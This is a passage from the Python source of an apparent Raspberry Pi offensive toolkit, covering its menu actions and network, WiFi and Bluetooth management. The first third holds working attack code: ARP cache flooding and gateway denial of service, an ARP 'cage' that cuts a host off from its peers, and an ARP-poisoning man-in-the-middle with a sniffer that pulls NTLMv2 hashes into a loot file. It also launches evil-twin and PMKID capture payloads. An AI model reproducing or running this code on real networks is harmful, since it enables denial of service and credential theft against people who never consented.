        tgt = _pick_host()
        if tgt and YNDialog("MITM", y="Yes", n="No", b=f"MITM {tgt}?"):
            do_mitm(tgt)

    def _arp_flood(self):
        """Real ARP cache flood: sends randomised ARP replies at high rate."""
        tgt   = _pick_host()
        iface = _get_interface_for_ip(tgt) if tgt else ktox_state["iface"]
        if not tgt:
            return
        pps = _ask_pps()
        if pps is None:
            return
        if not YNDialog("ARP FLOOD", y="Yes", n="No", b=f"Flood {tgt}\n@ {pps} pkt/s?"):
            return

        Dialog_info(f"Resolving MAC…\n{tgt}", wait=False, timeout=1)
        t_mac = _scapy_resolve(tgt, iface)
        if not t_mac:
            Dialog_info(f"MAC resolve\nfailed for\n{tgt}", wait=True)
            return

        gw = ktox_state.get("gateway", "")
        subnet = gw.rsplit(".", 1)[0] if gw else "192.168.1"
        interval = 1.0 / max(1, pps)
        script = (
            "import sys,time,random,logging,signal;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import Ether,ARP,sendp;"
            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
            f"iface='{iface}';t_ip='{tgt}';t_mac='{t_mac}';iv={interval!r};subnet='{subnet}';"
            "while True:"
            "  fip=subnet+'.'+str(random.randint(1,254));"
            "  fmac=':'.join(f'{random.randint(0,255):02x}' for _ in range(6));"
            "  sendp(Ether(src=fmac,dst=t_mac)/ARP(op=2,hwsrc=fmac,psrc=fip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
            "  time.sleep(iv)"
        )
        proc = subprocess.Popen(["python3", "-c", script],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ktox_state["running"] = f"ARP FLOOD {pps}/s"
        Dialog_info(f"ARP FLOOD\n{tgt}\n{pps} pkt/s\nsubnet src\nKEY3=stop", wait=True)
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()
        ktox_state["running"] = None
        Dialog_info("Flood stopped.", wait=False, timeout=1)

    def _gw_dos(self):
        """Flood gateway ARP table with random fake entries at configurable PPS."""
        gw    = ktox_state["gateway"]
        iface = _get_interface_for_ip(gw) if gw else ktox_state["iface"]
        if not gw:
            Dialog_info("No gateway!", wait=True)
            return
        pps = _ask_pps()
        if pps is None:
            return
        if not YNDialog("GW DoS", y="Yes", n="No", b=f"DoS {gw}\n@ {pps} pkt/s?"):
            return

        Dialog_info(f"Resolving GW MAC…\n{gw}", wait=False, timeout=1)
        gw_mac = _scapy_resolve(gw, iface)
        if not gw_mac:
            Dialog_info("GW MAC resolve\nfailed.", wait=True)
            return

        subnet = gw.rsplit(".", 1)[0]
        interval = 1.0 / max(1, pps)
        script = (
            "import sys,time,random,logging,signal;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import Ether,ARP,sendp;"
            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
            f"iface='{iface}';g_ip='{gw}';g_mac='{gw_mac}';iv={interval!r};subnet='{subnet}';"
            "while True:"
            "  fip=subnet+'.'+str(random.randint(1,254));"
            "  fmac=':'.join(f'{random.randint(0,255):02x}' for _ in range(6));"
            "  sendp(Ether(src=fmac,dst=g_mac)/ARP(op=2,hwsrc=fmac,psrc=fip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
            "  time.sleep(iv)"
        )
        proc = subprocess.Popen(["python3", "-c", script],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ktox_state["running"] = f"GW DoS {pps}/s"
        Dialog_info(f"GW DoS\n{gw}\n{pps} pkt/s\nsubnet src\nKEY3=stop", wait=True)
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()
        ktox_state["running"] = None
        Dialog_info("DoS stopped.", wait=False, timeout=1)

    def _arp_cage(self):
        """Isolate target from ALL peers: poisons target's view of every host."""
        tgt   = _pick_host()
        gw    = ktox_state["gateway"]
        iface = _get_interface_for_ip(tgt) if tgt else ktox_state["iface"]
        if not tgt or not gw:
            return
        peers = [h["ip"] for h in ktox_state.get("hosts", []) if h["ip"] != tgt]
        if not YNDialog("ARP CAGE", y="Yes", n="No",
                        b=f"Cage {tgt}\nfrom {len(peers)} peers?"):
            return

        Dialog_info(f"Resolving MACs…\n{tgt}", wait=False, timeout=1)
        t_mac    = _scapy_resolve(tgt, iface)
        gw_mac   = _scapy_resolve(gw, iface)
        if not t_mac:
            Dialog_info("Target MAC\nresolve failed.", wait=True)
            return

        # Resolve peer MACs (best effort)
        peer_macs = [(ip, _scapy_resolve(ip, iface)) for ip in peers]
        peer_macs = [(ip, mac) for ip, mac in peer_macs if mac]

        if not peer_macs:
            Dialog_info("No peer MACs\nresolved.", wait=True)
            return

        pps = _ask_pps()
        if pps is None:
            return

        interval = 1.0 / max(1, pps)
        p_list = ";".join(f"('{ip}','{mac}')" for ip, mac in peer_macs)
        script = (
            "import sys,time,logging,signal;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
            f"iface='{iface}';"
            f"my=get_if_hwaddr(iface);"
            f"t_ip='{tgt}';t_mac='{t_mac}';"
            f"iv={interval!r};"
            f"peers=[{p_list}];"
            "while True:"
            "  for p_ip,p_mac in peers:"
            "    sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=p_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
            "    time.sleep(iv)"
        )
        proc = subprocess.Popen(["python3", "-c", script],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ktox_state["running"] = "ARP CAGE"
        Dialog_info(
            f"Cage ACTIVE\n{tgt}\n{len(peer_macs)} peers @ {pps}/s\nKEY3=release",
            wait=True
        )
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()
        ktox_state["running"] = None
        # Restore target's view of all peers
        if t_mac and peer_macs:
            for p_ip, p_mac in peer_macs:
                _scapy_restore(tgt, t_mac, p_ip, p_mac, iface, "")
        Dialog_info("Cage released.\nARP restored.", wait=False, timeout=1)

    def _ntlm(self):
        """MITM + NTLMv2 sniffer: poison target then capture auth hashes."""
        tgt   = _pick_host()
        iface = _get_interface_for_ip(tgt) if tgt else ktox_state["iface"]
        gw    = ktox_state["gateway"]
        if not tgt or not gw:
            return
        if not YNDialog("NTLMv2", y="Yes", n="No",
                        b=f"MITM+capture\n{tgt}?"):
            return

        Dialog_info(f"Resolving MACs…\n{tgt}", wait=False, timeout=1)
        t_mac  = _scapy_resolve(tgt, iface)
        gw_mac = _scapy_resolve(gw, iface)
        if not t_mac or not gw_mac:
            Dialog_info("MAC resolve\nfailed.", wait=True)
            return

        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        loot_path = f"{LOOT_DIR}/ntlm_hashes.txt"

        # MITM subprocess
        mitm_script = (
            "import sys,time,logging,signal;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
            f"iface='{iface}';"
            f"my=get_if_hwaddr(iface);"
            f"t_ip='{tgt}';t_mac='{t_mac}';"
            f"g_ip='{gw}';g_mac='{gw_mac}';"
            "while True:"
            "  sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
            "  sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
            "  time.sleep(0.5)"
        )
        # NTLMv2 sniffer subprocess
        sniff_script = (
            "import sys,re,struct,logging,os;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import sniff,TCP,Raw,Ether,IP;"
            f"loot='{loot_path}';"
            "os.makedirs(os.path.dirname(loot),exist_ok=True);"
            "SIG=b'NTLMSSP\\x00';seen=set();"
            "def handle(pkt):\n"
            "  if not pkt.haslayer(TCP) or not pkt.haslayer(Raw): return\n"
            "  raw=pkt[Raw].load\n"
            "  idx=raw.find(SIG)\n"
            "  if idx<0: return\n"
            "  blob=raw[idx:]\n"
            "  try:\n"
            "    if len(blob)<12: return\n"
            "    mtype=struct.unpack_from('<I',blob,8)[0]\n"
            "    if mtype!=3: return\n"
            "    def f(blob,off): l,_,o=struct.unpack_from('<HHI',blob,off); return blob[o:o+l]\n"
            "    nt=f(blob,20); dom=f(blob,28); usr=f(blob,36)\n"
            "    if not nt or len(nt)<32: return\n"
            "    h=f'{usr.decode(\"utf-16-le\",errors=\"replace\")}::{dom.decode(\"utf-16-le\",errors=\"replace\")}::'+nt.hex()\n"
            "    if h not in seen: seen.add(h); print(f'NTLM: {h}',flush=True); open(loot,'a').write(h+'\\n')\n"
            "  except: pass\n"
            f"sniff(iface='{iface}',filter='tcp and (port 445 or port 80 or port 8080)',prn=handle,store=False)"
        )
        p_mitm  = subprocess.Popen(["python3", "-c", mitm_script],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p_sniff = subprocess.Popen(["python3", "-c", sniff_script],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ktox_state["running"] = "NTLMv2"
        Dialog_info(
            f"NTLMv2 CAPTURE\n{tgt}\nSMB+HTTP sniff\nKEY3=stop",
            wait=True
        )
        for p in (p_mitm, p_sniff):
            p.terminate()
            try: p.wait(timeout=2)
            except Exception: p.kill()
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        ktox_state["running"] = None
        _scapy_restore(tgt, t_mac, gw, gw_mac, iface, "")
        # Count captured hashes
        try:
            n = len(open(loot_path).readlines()) if os.path.exists(loot_path) else 0
        except Exception:
            n = 0
        Dialog_info(f"Capture stopped.\n{n} hash(es).\nLoot: ntlm_hashes.txt",
                    wait=False, timeout=2)

    # ── Loki Engine ───────────────────────────────────────────────────────────

    def _loki_engine(self):
        """Launch Loki autonomous security engine."""
        Dialog_info("Launching\nLoki...", wait=False, timeout=1)
        import subprocess
        import sys

        loki_script = os.path.join(
            os.path.dirname(__file__),
            "payloads", "offensive", "loki_engine.py"
        )

        if not os.path.exists(loki_script):
            Dialog_info("Loki script\nnot found", wait=True)
            return

        try:
            # Launch in new terminal/process
            subprocess.Popen([sys.executable, loki_script])
            Dialog_info("Loki launcher\nstarted", wait=False, timeout=2)
        except Exception as e:
            Dialog_info(f"Error:\n{str(e)[:30]}", wait=True)

    # ── WiFi actions ──────────────────────────────────────────────────────────

    def _handshake(self):
        do_handshake_targeted()

    def _pmkid(self):
        if not _require_monitor_iface():
            return
        exec_payload("wifi/pmkid_capture")

    def _evil_twin(self):
        exec_payload("wifi/evil_twin")

    def _select_adapter(self):
        rc, out = _run(["iw","dev"])
        import re
        ifaces = re.findall(r"Interface\s+(\w+)", out)
        if not ifaces:
            Dialog_info("No WiFi adapters!", wait=True)
            return
        sel = GetMenu([f" {i}" for i in ifaces])
        if sel:
            ktox_state["wifi_iface"] = sel.strip()
            Dialog_info(f"Adapter:\n{sel.strip()}", wait=True)

    # ── Responder ─────────────────────────────────────────────────────────────

    def _read_responder_logs(self):
        log_dir = Path(f"{INSTALL_PATH}Responder/logs")
        if not log_dir.exists():
            Dialog_info("No Responder logs.", wait=True)
            return
        files = sorted(log_dir.glob("*.log"), reverse=True)[:10]
        if not files:
            Dialog_info("No log files yet.", wait=True)
            return
        sel = GetMenu([f" {f.name[:22]}" for f in files])
        if not sel: return
        fname = sel.strip()
        match = [f for f in files if f.name == fname]
        if match:
            lines = match[0].read_text(errors="ignore").splitlines()
            GetMenu([f" {l[:24]}" for l in lines[:50]])

    # ── Purple Team ───────────────────────────────────────────────────────────

    def _verify_baseline(self):
        baselines = sorted(Path(LOOT_DIR).glob("baseline_*.json"), reverse=True)
        if not baselines:
            Dialog_info("No baseline.\nExport one first.", wait=True)
            return
        try:
            data    = json.loads(baselines[0].read_text())
            known   = {h["mac"]:h["ip"] for h in data.get("hosts",[]) if h.get("mac")}
            current = ktox_state["hosts"]
            issues  = []
            for h in current:
                mac = h.get("mac",h[1]) if isinstance(h,dict) else (h[1] if len(h)>1 else "")
                ip  = h.get("ip",h[0])  if isinstance(h,dict) else h[0]
                if mac and mac not in known:     issues.append(f"! ROGUE {ip}")
                elif mac and known.get(mac) != ip: issues.append(f"! MOVED {mac[:11]}")
            if issues: GetMenu(issues)
            else:      Dialog_info(f"✔ Clean!\n{len(current)} hosts match.", wait=True)
        except Exception as e:
            Dialog_info(f"Error:\n{str(e)[:28]}", wait=True)

    # ── Payloads ──────────────────────────────────────────────────────────────

    def _build_payload_menu(self):
        items = []
        for cat_key, cat_label in PAYLOAD_CATEGORIES:
            payloads = _list_payloads(cat_key)
            if payloads:
                items.append((f" {cat_label} ({len(payloads)})", f"pay_{cat_key}"))
        if not items:
            items = [(" No payloads found", lambda: Dialog_info(
                "Drop .py files into\n/root/KTOx/payloads\n/<category>/", wait=True))]
        # Also add the dynamic category submenus
        tree = self._get_payload_submenus()
        return tuple(items)

    def _get_payload_submenus(self):
        """Return a dict of pay_<cat> -> tuple of (label, callable) for navigate()."""
        subs = {}
        for cat_key, cat_label in PAYLOAD_CATEGORIES:
            payloads = _list_payloads(cat_key)
            if payloads:
                subs[f"pay_{cat_key}"] = tuple(
                    (f" {name}", partial(exec_payload, path))
                    for name, path in payloads
                )
        return subs

    # Override navigate to handle dynamic payload submenus
    def navigate(self, key):
        # Inject payload sub-menus into tree dynamically
        if key.startswith("pay_"):
            cat_key  = key[4:]
            payloads = _list_payloads(cat_key)
            if not payloads:
                Dialog_info("No payloads\nin this category.", wait=True)
                return
            items    = [(f" {name}", partial(exec_payload, path))
                        for name, path in payloads]
            labels   = [i[0] for i in items]
            sel      = 0
            WINDOW   = _ux_window_rows()
            # Resolve display title for this category
            cat_title = next(
                (lbl for k, lbl in PAYLOAD_CATEGORIES if k == cat_key), cat_key.upper()
            )
            cat_icon  = _icon_for(cat_title)
            while True:
                total  = len(labels)
                offset = max(0, min(sel - 2, total - WINDOW))
                window = labels[offset:offset + WINDOW]
                _ST    = int(_ui_ux.get("start_y", 26))
                _RH    = int(_ui_ux.get("row_h", 13))
                with draw_lock:
                    _draw_toolbar()
                    color.DrawMenuBackground()
                    color.DrawBorder()
                    # ── Category title strip ──────────────────────────────
                    draw.rectangle([3, 13, 125, 24], fill=color.title_bg)
                    _hdr = (cat_icon + " " if cat_icon else "") + cat_title
                    _centered(_hdr[:20], 13, font=small_font, fill=color.border)
                    draw.line([(3, 24), (125, 24)], fill=color.border, width=1)
                    # ── Items ─────────────────────────────────────────────
                    for i, label in enumerate(window):
                        is_sel = (i == sel - offset)
                        row_y  = _ST + _RH * i
                        if is_sel:
                            if _ui_ux.get("select_style") == "outline":
                                draw.rectangle([3, row_y, 124, row_y + _RH - 1],
                                               outline=color.select, width=2)
                            else:
                                draw.rectangle([3, row_y, 124, row_y + _RH - 1],
                                               fill=color.select)
                        fill = color.selected_text if is_sel else color.text
                        icon = _icon_for(label)
                        if icon and _ui_ux.get("show_icons", True):
                            draw.text((5,  row_y + 1), icon, font=icon_font, fill=fill)
                            t = _truncate(label.strip(), 96)
                            draw.text((19, row_y + 1), t,    font=text_font, fill=fill)
                        else:
                            t = _truncate(label.strip(), 110)
                            draw.text((5,  row_y + 1), t,    font=text_font, fill=fill)
                    # ── Scroll pip ────────────────────────────────────────
                    if total > WINDOW:
                        avail = _RH * WINDOW
                        pip_h = max(6, int(WINDOW / total * avail))
                        pip_y = _ST + int(offset / max(1, total - WINDOW) * (avail - pip_h))
                        draw.rectangle([125, pip_y, 127, pip_y + pip_h],
                                       fill=color.border)
                time.sleep(0.08)
                btn = getButton(timeout=0.5)
                if btn is None:                                  continue
                elif btn == "KEY_DOWN_PIN":                      sel = (sel + 1) % total
                elif btn == "KEY_UP_PIN":                        sel = (sel - 1) % total
                elif btn in ("KEY_PRESS_PIN", "KEY_RIGHT_PIN"):  items[sel][1]()
                elif btn in ("KEY_LEFT_PIN", "KEY1_PIN"):        return
                elif btn == "KEY2_PIN":
                    self.which = "home"; return
                elif btn == "KEY3_PIN":
                    _handle_menu_key3()
                    continue
            return

        # Standard navigate
        tree = self._menu()

        if key == "loot":
            self._browse_loot()
            return

        items = tree.get(key)
        if not items:
            Dialog_info("Empty menu.", wait=True)
            return

        labels = [item[0] for item in items]
        # View modes ONLY for Home menu, everything else uses List view
        if key == "home":
            sel_result = GetMenu(labels, duplicates=True, title="home", view_modes=True)
        else:
            sel_result = GetMenuString(labels, duplicates=True, title=key)

        if not sel_result:
            return

        sel, _ = sel_result
        if sel == -1:
            return
        self.select = sel
        action = items[sel][1]

        if isinstance(action, str):
            saved      = self.which
            self.which = action
            self.navigate(action)
            self.which = saved
        elif callable(action):
            action()

    
    def _nav_scan(self):
        # Canonical KTOx payload wrapper for Navarro username OSINT.
        exec_payload("recon/navarro.py")

    def _nav_status(self):
        nav_candidates = [
            f"{default.payload_path}recon/navarro_engine.py",
            f"{KTOX_DIR}/Navarro/navarro.py",
            "/home/ktox/Navarro/navarro.py",
            "/root/Navarro/navarro.py",
        ]
        nav_found = next((p for p in nav_candidates if os.path.exists(p)), None)

        rc_req, reqs = _run(["python3", "-m", "pip", "show", "requests"])
        rc_rich, rich = _run(["python3", "-m", "pip", "show", "rich"])
        requests_ok = (rc_req == 0 and bool(reqs.strip()))
        rich_ok = (rc_rich == 0 and bool(rich.strip()))

        GetMenu([
            " Navarro Recon Status",
            f" payload: {'OK' if os.path.exists(f'{default.payload_path}recon/navarro.py') else 'MISSING'}",
            f" engine:  {'OK' if nav_found else 'MISSING'}",
            f" requests:{'OK' if requests_ok else 'MISSING'}",
            f" rich:    {'OK' if rich_ok else 'OPTIONAL'}",
            " Engine paths:",
            f" {default.payload_path}recon/navarro_engine.py",
            " /root/KTOx/Navarro/navarro.py",
            " Reports: /root/KTOx/loot/OSINT",
        ])

    def _nav_reports(self):
        os.makedirs(f"{KTOX_DIR}/loot/OSINT", exist_ok=True)
        self._browse_dir(f"{KTOX_DIR}/loot/OSINT", "Navarro Reports")

    def home_loop(self):
        while True:
            req = _check_payload_request()
            if req:
                exec_payload(req)
                continue
            self.navigate("home")

    # ── System actions ─────────────────────────────────────────────────────────

    def _webui_status(self):
        ip = get_ip()
        GetMenu([
            f" WebUI:  http://{ip}:8080",
            f" WS:     ws://{ip}:8765",
            f" Frame:  /dev/shm/ktox_last.jpg",
            " Open from any browser",
            " on the same LAN.",
        ])

    def _refresh(self):
        Dialog_info("Refreshing…", wait=False, timeout=1)
        refresh_state()
        Dialog_info(f"IF: {ktox_state['iface']}\nGW: {ktox_state['gateway']}", wait=True)

    def _nmcli_available(self) -> bool:
        rc, _ = _run(["which", "nmcli"], timeout=4)
        return rc == 0

    def _nmcli(self, *args, timeout=12):
        return _run(["nmcli", *args], timeout=timeout)

    def _network_interfaces_menu(self):
        rc, out = _run(["ip", "-o", "link", "show"], timeout=8)
        if rc != 0:
            Dialog_info("Failed to read\ninterfaces.", wait=True)
            return
        import re
        ifaces = [i for i in re.findall(r"\d+:\s+([A-Za-z0-9_.:-]+):", out) if i != "lo"]
        if not ifaces:
            Dialog_info("No interfaces\nfound.", wait=True)
            return
        labels = [f" {i}" for i in ifaces]
        sel = GetMenuString(labels, duplicates=True, title="Interfaces")
        if not sel:
            return
        idx, _ = sel
        iface = ifaces[idx]
        while True:
            pick = GetMenuString([
                f" {iface}",
                " Bring Up",
                " Bring Down",
                " Renew DHCP",
                " Back",
            ], title="IF Action")
            if not pick:
                return
            s = pick.strip()
            if s == "Bring Up":
                _run(["ip", "link", "set", iface, "up"], timeout=8)
                Dialog_info(f"{iface}\nset UP", wait=False, timeout=1)
            elif s == "Bring Down":
                _run(["ip", "link", "set", iface, "down"], timeout=8)
                Dialog_info(f"{iface}\nset DOWN", wait=False, timeout=1)
            elif s == "Renew DHCP":
                _run(["dhclient", "-r", iface], timeout=10)
                _run(["dhclient", iface], timeout=12)
                Dialog_info(f"DHCP renewed\n{iface}", wait=False, timeout=1)
            elif s == "Back":
                return

    def _network_wifi_scan_menu(self):
        iface = ktox_state.get("wifi_iface", "wlan0")
        if not self._nmcli_available():
            Dialog_info("nmcli missing.\nInstall Network\nManager.", wait=True)
            return
        Dialog_info(f"Scanning WiFi\non {iface}...", wait=False, timeout=1)
        rc, out = self._nmcli("-t", "--escape", "no", "-f", "IN-USE,SSID,SIGNAL,SECURITY",
                              "dev", "wifi", "list", "ifname", iface, timeout=15)
        rows = []
        for ln in out.splitlines():
            parts = ln.split(":", 3)
            if len(parts) < 4:
                continue
            in_use, ssid, signal, sec = parts
            ssid = ssid or "<hidden>"
            rows.append((in_use == "*", ssid, signal or "?", sec or "open"))
        if not rows:
            Dialog_info("No WiFi APs\nfound.", wait=True)
            return
        labels = [
            f" {'*' if use else ' '} {ssid[:12]:12} {sig:>3}% {sec[:6]}"
            for use, ssid, sig, sec in rows
        ]
        GetMenuString(labels, title="WiFi Scan")

    def _network_saved_profiles_menu(self):
        if not self._nmcli_available():
            Dialog_info("nmcli missing.\nNo profile mgr.", wait=True)
            return
        rc, out = self._nmcli("-t", "--escape", "no", "-f", "NAME,TYPE", "connection", "show", timeout=10)
        profiles = []
        for ln in out.splitlines():
            if ":" not in ln:
                continue
            name, typ = ln.split(":", 1)
            if typ in ("wifi", "ethernet", "802-11-wireless", "802-3-ethernet"):
                profiles.append((name, typ))
        if not profiles:
            Dialog_info("No saved\nprofiles.", wait=True)
            return
        labels = [f" {n[:18]} ({t})" for n, t in profiles]
        sel = GetMenuString(labels, duplicates=True, title="Profiles")
        if not sel:
            return
        idx, _ = sel
        name, _typ = profiles[idx]
        while True:
            pick = GetMenuString([
                f" {name[:20]}",
                " Connect",
                " Disconnect",
                " Forget Profile",
                " Back",
            ], title="Profile")
            if not pick:
                return
            s = pick.strip()
            if s == "Connect":
                self._nmcli("connection", "up", name, timeout=20)
                Dialog_info(f"Connect req:\n{name[:20]}", wait=False, timeout=1)
            elif s == "Disconnect":
                self._nmcli("connection", "down", name, timeout=20)
                Dialog_info(f"Disconnect:\n{name[:20]}", wait=False, timeout=1)
            elif s == "Forget Profile":
                self._nmcli("connection", "delete", name, timeout=20)
                Dialog_info(f"Deleted:\n{name[:20]}", wait=False, timeout=1)
                return
            elif s == "Back":
                return

    def _network_status_screen(self):
        rc_ip, ip_br = _run(["ip", "-br", "addr"], timeout=8)
        rc_rt, route = _run(["ip", "route", "show", "default"], timeout=8)
        dns = []
        try:
            for ln in Path("/etc/resolv.conf").read_text(errors="ignore").splitlines():
                if ln.startswith("nameserver"):
                    dns.append(ln.split()[1])
        except Exception:
            pass
        lines = [
            f" IF: {ktox_state.get('iface','?')}",
            f" WiFi: {ktox_state.get('wifi_iface','?')}",
            f" GW: {(route.strip() or 'none')[:18]}",
            f" DNS: {(dns[0] if dns else 'none')[:18]}",
        ]
        if rc_ip == 0:
            lines += [f" {ln[:22]}" for ln in ip_br.splitlines()[:6]]
        GetMenuString(lines, title="Net Status")

    def _network_manager(self):
        while True:
            choice = GetMenuString([
                " Status",
                " Interfaces",
                " WiFi Scan",
                " Saved Profiles",
                " Refresh State",
                " Back",
            ], title="Network Mgr")
            if not choice:
                return
            s = choice.strip()
            if s == "Status":
                self._network_status_screen()
            elif s == "Interfaces":
                self._network_interfaces_menu()
            elif s == "WiFi Scan":
                self._network_wifi_scan_menu()
            elif s == "Saved Profiles":
                self._network_saved_profiles_menu()
            elif s == "Refresh State":
                self._refresh()
            elif s == "Back":
                return

    def _bt_parse_devices(self, output: str):
        import re
        devices = []
        for line in output.splitlines():
            m = re.match(r"Device\s+([0-9A-Fa-f:]{17})\s+(.+)$", line.strip())
            if m:
                mac = m.group(1).upper()
                name = m.group(2).strip() or "Unknown"
                devices.append((mac, name))
        return devices

    def _btctl(self, *args, timeout=12):
        rc, out = _run(["bluetoothctl", *args], timeout=timeout)
        return rc, (out or "").strip()

    def _bt_prepare_controller(self):
        _run(["rfkill", "unblock", "bluetooth"], timeout=4)
        _run(["systemctl", "start", "bluetooth"], timeout=6)
        self._btctl("power", "on", timeout=8)
        self._btctl("agent", "on", timeout=8)
        self._btctl("default-agent", timeout=8)
        self._btctl("pairable", "on", timeout=8)

    def _bt_is_audio_device(self, mac: str) -> bool:
        _, info = self._btctl("info", mac, timeout=10)
        info_l = info.lower()
        markers = (
            "audio sink", "audio source", "headset", "headphones",
            "a2dp", "avrcp", "handsfree",
        )
        return any(m in info_l for m in markers)

    def _bt_scan_devices(self, seconds: int = 15, audio_only: bool = False):
        self._bt_prepare_controller()
        Dialog_info(f"Scanning BT...\n~{seconds}s", wait=False, timeout=1)
        self._btctl("scan", "on", timeout=max(6, seconds + 1))
        self._btctl("scan", "off", timeout=6)
        _, out = self._btctl("devices", timeout=8)
        devices = self._bt_parse_devices(out)
        if audio_only and devices:
            devices = [(m, n) for m, n in devices if self._bt_is_audio_device(m)]
        return devices

    def _bt_device_action_menu(self, mac: str, name: str):
        while True:
            choice = GetMenuString([
                f" {name[:18]}",
                f" {mac}",
                " Pair + Trust + Connect",
                " Connect",
                " Trust Device",
                " Disconnect",
                " Forget Device",
                " Device Info",
                " Back",
            ], title="Bluetooth")
            if not choice:
                return
            picked = choice.strip()
            if picked == "Pair + Trust + Connect":
                self._btctl("pair", mac, timeout=30)
                self._btctl("trust", mac, timeout=10)
                self._btctl("connect", mac, timeout=20)
                Dialog_info(f"Pair/connect\nsent:\n{name[:18]}", wait=False, timeout=1)
            elif picked == "Connect":
                self._btctl("trust", mac, timeout=10)
                self._btctl("connect", mac, timeout=20)
                Dialog_info(f"Connect sent:\n{name[:18]}", wait=False, timeout=1)
            elif picked == "Trust Device":
                self._btctl("trust", mac, timeout=10)
                Dialog_info(f"Trusted:\n{name[:18]}", wait=False, timeout=1)
            elif picked == "Disconnect":
                self._btctl("disconnect", mac, timeout=15)
                Dialog_info(f"Disconnect:\n{name[:18]}", wait=False, timeout=1)
            elif picked == "Forget Device":
                self._btctl("remove", mac, timeout=15)
                Dialog_info(f"Forgot:\n{name[:18]}", wait=False, timeout=1)
                return
            elif picked == "Device Info":
                _, info = self._btctl("info", mac, timeout=10)
                lines = [f" {name[:18]}", f" {mac}"] + [f" {ln[:22]}" for ln in info.splitlines()[:10]]
                GetMenu(lines)
            elif picked == "Back":
                return

    def _bluetooth_manager(self):
        self._bt_prepare_controller()
        while True:
            choice = GetMenuString([
                " Scan Devices",
                " Scan Audio Devices",
                " Paired Devices",
                " Connected Devices",
                " Make Discoverable",
                " Discoverable Off",
                " Reset BT Stack",
                " Controller Status",
                " Back",
            ], title="Bluetooth")
            if not choice:
                return
            picked = choice.strip()
            if picked == "Scan Devices":
                devices = self._bt_scan_devices(seconds=15, audio_only=False)
                if not devices:
                    Dialog_info("No BT devices\nfound.\n(put device in\npair mode)", wait=True)
                    continue
                labels = [f" {n[:14]} {m}" for m, n in devices]
                sel = GetMenuString(labels, duplicates=True, title="BT Scan")
                if not sel:
                    continue
                idx, _ = sel
                mac, name = devices[idx]
                self._bt_device_action_menu(mac, name)
            elif picked == "Scan Audio Devices":
                devices = self._bt_scan_devices(seconds=18, audio_only=True)
                if not devices:
                    Dialog_info("No audio BT\nfound.\nHeadphones must\nbe in pair mode.", wait=True)
                    continue
                labels = [f" {n[:14]} {m}" for m, n in devices]
                sel = GetMenuString(labels, duplicates=True, title="BT Audio")
                if not sel:
                    continue
                idx, _ = sel
                mac, name = devices[idx]
                self._bt_device_action_menu(mac, name)
            elif picked == "Paired Devices":
                _, out = self._btctl("paired-devices", timeout=8)
                paired = self._bt_parse_devices(out)
                if not paired:
                    Dialog_info("No paired BT\ndevices.", wait=True)
                    continue
                labels = [f" {n[:14]} {m}" for m, n in paired]
                sel = GetMenuString(labels, duplicates=True, title="Paired BT")
                if not sel:
                    continue
                idx, _ = sel
                mac, name = paired[idx]
                self._bt_device_action_menu(mac, name)
            elif picked == "Connected Devices":
                _, out = self._btctl("devices", "Connected", timeout=8)
                connected = self._bt_parse_devices(out)
                if not connected:
                    Dialog_info("No connected\nBT devices.", wait=True)
                    continue
                labels = [f" {n[:14]} {m}" for m, n in connected]
                sel = GetMenuString(labels, duplicates=True, title="Connected BT")
                if not sel:
                    continue
                idx, _ = sel
                mac, name = connected[idx]
                self._bt_device_action_menu(mac, name)
            elif picked == "Make Discoverable":
                self._btctl("discoverable", "on", timeout=8)
                self._btctl("pairable", "on", timeout=8)
                Dialog_info("Bluetooth set:\nDiscoverable\nPairable", wait=False, timeout=1)
            elif picked == "Discoverable Off":
                self._btctl("discoverable", "off", timeout=8)
                Dialog_info("Bluetooth:\nDiscoverable OFF", wait=False, timeout=1)
            elif picked == "Reset BT Stack":
                _run(["systemctl", "restart", "bluetooth"], timeout=10)
                self._bt_prepare_controller()
                Dialog_info("Bluetooth stack\nrestarted.", wait=False, timeout=1)
            elif picked == "Controller Status":
                _, show = self._btctl("show", timeout=8)
                lines = [f" {ln[:22]}" for ln in show.splitlines()[:12]] or [" No controller info"]
                GetMenu(lines)
            elif picked == "Back":
                return

    def _sysinfo(self):
        rc, kern = _run(["uname","-r"])
        rc2, up  = _run(["uptime","-p"])
        GetMenu([
            f" KTOx_Pi v{VERSION}",
            f" Kernel: {kern.strip()[:18]}",
            f" {up.strip()[:22]}",
            f" Temp:  {_temp_c:.1f} C",
            f" Loot:  {loot_count()} files",
            f" IP:    {get_ip()}",
        ])

    def _ui_theme_menu(self):
        while True:
            menu = [
                " Theme Presets",
                " User Themes",
                " Custom Colors",
                " Save as User Theme",
                " View Mode",
